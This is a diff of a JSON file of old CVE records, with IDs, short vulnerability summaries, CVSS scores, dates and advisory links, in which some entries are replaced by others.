-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "1997-03-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://www.cve.org/CVERecord?id=CVE-1999-0106",
-        "https://www.cve.org/CVERecord?id=CVE-1999-0106"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1176",
-      "summary": "Directory traversal vulnerability in YaBB search.pl CGI script allows remote attackers to read arbitrary files via a .. (dot dot) attack in the \"catsearch\" form field.",
+      "id": "CVE-2003-0770",
+      "summary": "FUNC.pm in IkonBoard 3.1.2a and earlier, including 3.1.1, does not properly cleanse the \"lang\" cookie when it contains illegal characters, which allows remote attackers to execute arbitrary code when the cookie is inserted into a Perl \"eval\" statement.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2001-01-09",
+      "published": "2003-09-22",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0110.html",
-        "http://www.securityfocus.com/bid/1921",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0110.html",
-        "http://www.securityfocus.com/bid/1921"
+        "http://marc.info/?l=bugtraq&m=106381136115972&w=2",
+        "http://www.securityfocus.com/archive/1/317234",
+        "http://www.securityfocus.com/archive/1/336598",
+        "http://marc.info/?l=bugtraq&m=106381136115972&w=2",
+        "http://www.securityfocus.com/archive/1/317234"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1177",
-      "summary": "bb-hist.sh, bb-histlog.sh, bb-hostsvc.sh, bb-rep.sh, bb-replog.sh, and bb-ack.sh in Big Brother (BB) before 1.5d3 allows remote attackers to determine the existence of files and user ID's by specifying the target file in the HISTFILE parameter.",
+      "id": "CVE-2002-0247",
+      "summary": "Buffer overflows in wmtv 0.6.5 and earlier may allow local users to gain privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2002/dsa-108",
+        "http://www.iss.net/security_center/static/8111.php",
+        "http://www.securityfocus.com/bid/4054",
+        "http://www.debian.org/security/2002/dsa-108",
+        "http://www.iss.net/security_center/static/8111.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0248",
+      "summary": "wmtv 0.6.5 and earlier allows local users to modify arbitrary files via a symlink attack on a configuration file.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2002/dsa-108",
+        "http://www.iss.net/security_center/static/8110.php",
+        "http://www.securityfocus.com/bid/4052",
+        "http://www.debian.org/security/2002/dsa-108",
+        "http://www.iss.net/security_center/static/8110.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0249",
+      "summary": "PHP for Windows, when installed on Apache 2.0.28 beta as a standalone CGI module, allows remote attackers to obtain the physical path of the php.exe via a request with malformed arguments such as /123, which leaks the pathname in the error message.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "2002-05-29",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0284.html",
-        "http://bb4.com/incident.nov21",
-        "http://www.securityfocus.com/bid/1971",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0284.html",
-        "http://bb4.com/incident.nov21"
+        "http://marc.info/?l=bugtraq&m=101311698909691&w=2",
+        "http://www.iss.net/security_center/static/8121.php",
+        "http://www.securityfocus.com/bid/4056",
+        "http://marc.info/?l=bugtraq&m=101311698909691&w=2",
+        "http://www.iss.net/security_center/static/8121.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0850",
-      "summary": "The TCP reassembly functionality in libnids before 1.18 allows remote attackers to cause \"memory corruption\" and possibly execute arbitrary code via \"overlarge TCP packets.\"",
+      "id": "CVE-2002-0250",
+      "summary": "Web configuration utility in HP AdvanceStack hubs J3200A through J3210A with firmware version A.03.07 and earlier, allows unauthorized users to bypass authentication via a direct HTTP request to the web_access.html file, which allows the user to change the switch's configuration and modify the administrator password.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-11-17",
+      "published": "2002-05-29",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000773",
-        "http://marc.info/?l=bugtraq&m=106728224210446&w=2",
-        "http://secunia.com/advisories/10543",
-        "http://sourceforge.net/project/shownotes.php?release_id=191323",
-        "http://www.debian.org/security/2004/dsa-410"
+        "http://marc.info/?l=bugtraq&m=101318469216213&w=2",
+        "http://online.securityfocus.com/advisories/3870",
+        "http://www.iss.net/security_center/static/8124.php",
+        "http://www.securityfocus.com/bid/4062",
+        "http://marc.info/?l=bugtraq&m=101318469216213&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0852",
-      "summary": "Format string vulnerability in send_message.c for Sylpheed-claws 0.9.4 through 0.9.6 allows remote SMTP servers to cause a denial of service (crash) in sylpheed via format strings in an error message.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-11-17",
+      "id": "CVE-2002-0251",
+      "summary": "Buffer overflow in licq 1.0.4 and earlier allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long string of format string characters such as \"%d\".",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-October/012542.html",
-        "http://sylpheed.good-day.net/#changes",
-        "http://www.guninski.com/sylph.html",
-        "http://www.securityfocus.com/bid/8877",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13508"
+        "http://marc.info/?l=bugtraq&m=101301254432079&w=2",
+        "http://marc.info/?l=bugtraq&m=101318594420200&w=2",
+        "http://www.iss.net/security_center/static/8107.php",
+        "http://www.securityfocus.com/bid/4036",
+        "http://marc.info/?l=bugtraq&m=101301254432079&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0252",
+      "summary": "Buffer overflow in Apple QuickTime Player 5.01 and 5.02 allows remote web servers to execute arbitrary code via a response containing a long Content-Type MIME header.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101320742616105&w=2",
+        "http://www.iss.net/security_center/static/8126.php",
+        "http://www.securityfocus.com/bid/4064",
+        "https://www.exploit-db.com/exploits/4673",
+        "http://marc.info/?l=bugtraq&m=101320742616105&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0253",
+      "summary": "PHP, when not configured with the \"display_errors = Off\" setting in php.ini, allows remote attackers to obtain the physical path for an include file via a trailing slash in a request to a directly accessible PHP program, which modifies the base path, causes the include directive to fail, and produces an error message that contains the path.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101318944130790&w=2",
+        "http://www.iss.net/security_center/static/8122.php",
+        "http://www.securityfocus.com/bid/4063",
+        "http://marc.info/?l=bugtraq&m=101318944130790&w=2",
+        "http://www.iss.net/security_center/static/8122.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0360",
+      "summary": "Multiple buffer overflows in gPS before 1.0.0 allow attackers to cause a denial of service and possibly execute arbitrary code.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-06-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://gps.seul.org/changelog.html",
+        "http://www.debian.org/security/2003/dsa-307",
+        "http://gps.seul.org/changelog.html",
+        "http://www.debian.org/security/2003/dsa-307"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0361",
+      "summary": "gPS before 1.1.0 does not properly follow the rgpsp connection source acceptation policy as specified in the rgpsp.conf file, which could allow unauthorized remote attackers to connect to rgpsp.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-06-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://gps.seul.org/changelog.html",
+        "http://www.debian.org/security/2003/dsa-307",
+        "http://gps.seul.org/changelog.html",
+        "http://www.debian.org/security/2003/dsa-307"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0652",
+      "summary": "BEA WebLogic Server and WebLogic Express 7.0 through 7.0 Service Pack 4, and 8.1 through 8.1 Service Pack 2, allows attackers to obtain the username and password for booting the server by directly accessing certain internal methods.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://dev2dev.bea.com/resourcelibrary/advisoriesnotifications/BEA04_55.00.jsp",
+        "http://secunia.com/advisories/11359",
+        "http://securitytracker.com/id?1009766",
+        "http://www.kb.cert.org/vuls/id/352110",
+        "http://www.osvdb.org/5296"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0836",
+      "summary": "Buffer overflow in Oracle9iAS Web Cache 2.0.0.1 allows remote attackers to execute arbitrary code via a long HTTP GET request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-12-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100342151132277&w=2",
+        "http://marc.info/?l=bugtraq&m=100395487007578&w=2",
+        "http://otn.oracle.com/deploy/security/pdf/webcache.pdf",
+        "http://www.cert.org/advisories/CA-2001-29.html",
+        "http://www.kb.cert.org/vuls/id/649979"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1423",
+      "summary": "Advanced Poll before 1.61, when using a flat file database, allows remote attackers to gain privileges by setting the logged_in parameter.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://securitytracker.com/id?1002516",
+        "http://www.kb.cert.org/vuls/id/140723",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7861",
+        "http://securitytracker.com/id?1002516",
+        "http://www.kb.cert.org/vuls/id/140723"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1280",
+      "summary": "POP3 Server for Ipswitch IMail 7.04 and earlier generates different responses to valid and invalid user names, which allows remote attackers to determine users on the system.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3424",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1281",
+      "summary": "Web Messaging Server for Ipswitch IMail 7.04 and earlier allows remote authenticated users to change information for other users by modifying the olduser parameter in the \"Change User Information\" web form.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3429",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
